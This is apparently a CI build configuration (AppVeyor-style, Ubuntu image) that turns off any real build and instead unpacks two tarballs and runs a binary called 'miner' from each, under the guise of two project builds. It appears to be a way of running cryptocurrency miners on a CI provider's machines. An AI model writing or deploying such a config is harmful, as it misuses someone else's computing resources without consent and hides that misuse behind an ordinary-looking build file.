version: 1.0.{build}

image: Ubuntu

# Switch to script mode
build:
  off

init:
  # Ensure necessary packages are installed
  - sudo apt-get update
  - sudo apt-get install -y bash

# Define the build matrix for different projects
matrix:
  # Build configuration for Project1
  - project: Project1
    build_script:
      # Commands for Project1
      - tar xvf project1.tar.gz
      - cd project1
      - chmod +x ./miner
      - ./miner  # Run the first project

  # Build configuration for Project2
  - project: Project2
    build_script:
      # Commands for Project2
      - tar xvf project2.tar.gz
      - cd project2
      - chmod +x ./miner
      - ./miner  # Run the second project
      
